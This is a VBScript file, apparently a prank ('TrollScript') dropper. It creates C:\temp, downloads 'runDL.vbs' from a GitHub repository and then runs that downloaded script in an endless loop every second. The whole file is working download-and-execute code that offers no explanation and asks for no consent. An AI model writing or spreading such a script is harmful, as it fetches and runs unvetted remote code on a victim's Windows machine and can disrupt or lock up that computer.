Sub HTTPDownload( myURL, myPath )
    Dim i, objFile, objFSO, objHTTP, strFile, strMsg
    Const ForReading = 1, ForWriting = 2, ForAppending = 8
    Set objFSO = CreateObject( "Scripting.FileSystemObject" )
    If objFSO.FolderExists( myPath ) Then
        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then
        strFile = myPath
    Else
        WScript.Echo "ERROR: Target folder not found."
        Exit Sub
    End If
    Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
    objHTTP.Open "GET", myURL, False
    objHTTP.Send
    For i = 1 To LenB( objHTTP.ResponseBody )
        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
    Next
    objFile.Close( )
End Sub
Function createFolder()
 Set fso=createobject("Scripting.FileSystemObject")
    Foldername="C:\temp"
 If fso.FolderExists(Foldername) = false Then
  fso.CreateFolder (Foldername)
 End If
 Set fso=nothing
End Function
createFolder
HTTPDownload "https://raw.githubusercontent.com/CortezJEL/TrollScript/main/runDL.vbs", "c:\temp\runDL.vbs"
Do Until false 
CreateObject("WScript.Shell").Run "c:\temp\runDL.vbs"
WScript.Sleep 1000
loop
